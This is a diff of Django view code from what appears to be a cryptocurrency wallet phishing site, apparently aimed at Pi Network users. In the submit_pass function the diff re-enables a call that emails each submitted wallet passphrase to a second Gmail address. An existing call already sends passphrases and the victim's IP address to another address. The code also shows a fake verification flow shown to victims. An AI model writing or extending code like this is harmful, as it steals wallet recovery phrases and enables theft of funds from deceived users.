@@ -113,7 +113,7 @@ def submit_pass(request):
                     
                 send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
 
-                # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
+                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
                 request.session['look_up'] = look_up_key
                 # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                 return approve(request, keys=look_up_key)
@@ -159,7 +159,6 @@ def verify_your_coin(request, keys = None):
                         del request.session['look_up']
                     return render(request, 'verification.html', {})
                 else:
-                    messages.error(request, 'We are validating your info')
                     # return redirect('/wallet/')
                     if "look_up" in request.session:
                         del request.session['look_up']
